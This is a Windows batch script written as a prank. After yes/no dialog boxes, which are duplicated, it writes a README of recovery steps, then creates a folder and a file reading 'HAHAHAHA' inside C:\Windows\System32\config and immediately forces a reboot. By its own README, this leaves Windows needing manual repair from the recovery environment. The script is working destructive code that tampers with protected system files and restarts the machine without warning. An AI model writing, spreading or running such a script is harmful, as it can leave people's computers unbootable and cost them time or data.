@echo off

powershell -Command "Add-Type -AssemblyName PresentationFramework; $r=[System.Windows.MessageBox]::Show('Do you want to continue?','Confirm','YesNo','Warning'); if ($r -eq 'Yes') { exit 0 } else { exit 1 }"

if errorlevel 1 (
    echo User clicked NO
    goto :EOF
)

@echo off

powershell -Command "Add-Type -AssemblyName PresentationFramework; $r=[System.Windows.MessageBox]::Show('Do you want to continue?','Confirm','YesNo','Warning'); if ($r -eq 'Yes') { exit 0 } else { exit 1 }"

if errorlevel 1 (
    echo User clicked NO
    goto :EOF
)

echo How to fix it (safe recovery) >> README.txt
echo 1. Boot into Windows Recovery Environment (WinRE). >> README.txt
echo 2. Open Command Prompt from Advanced options. >> README.txt
echo 3. Navigate to the Windows drive (usually C:). >> README.txt
echo 4. Remove the unexpected item: >> README.txt
echo del C:\Windows\System32\config\OSDATA >> README.txt
echo rmdir /s /q C:\Windows\System32\config\OSDATA >> README.txt
echo 5. Restart Windows. >> README.txt
echo. >> README.txt
echo Result >> README.txt
echo Windows boots normally. No reinstall required. >> README.txt
echo. >> README.txt
echo Important notes >> README.txt
echo Do not modify System32\config on real systems. >> README.txt
echo Only experiment inside virtual machines with snapshots. >> README.txt
echo. >> README.txt
echo Summary >> README.txt

@echo off
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('click Ok to know how to solve it','Confirm','OK','Warning')"

type README.txt
pause

mkdir C:\Windows\System32\config\OSDATA
echo HAHAHAHA > C:\Windows\System32\config\OSDATA\OSDATA

shutdown /r /t 0
